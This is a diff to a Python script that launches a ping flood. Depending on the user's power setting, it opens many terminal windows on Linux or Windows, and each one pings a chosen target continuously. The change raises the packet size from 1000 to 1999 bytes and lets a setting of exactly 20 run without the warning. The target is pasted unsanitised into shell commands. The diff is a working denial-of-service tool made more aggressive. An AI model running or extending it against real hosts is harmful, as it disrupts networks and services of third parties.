@@ -62,11 +62,11 @@ def start():
 
 	if platform.system()== 'Linux':
 		for k in range(pwr):
-			host = subprocess.Popen('lxterminal -e ping ' + str(target) + ' -i 0.2 -s 1000', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
+			host = subprocess.Popen('lxterminal -e ping ' + str(target) + ' -i 0.2 -s 1999', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
 
 	if platform.system()== 'Windows':
 		for k in range(pwr):
-			subprocess.Popen('start cmd /k ping -t -l 1000 ' + str(target), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
+			subprocess.Popen('start cmd /k ping -t -l 1999 ' + str(target), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
 
 	clear()
 	print(Fore.CYAN + " [!] Started")
@@ -83,6 +83,6 @@ if pwr>20:
 		start()
 	if warning=='n':
 		sys.exit(1)
-if pwr<20:
+if pwr<20 or pwr==20:
 	banner()
 	start()
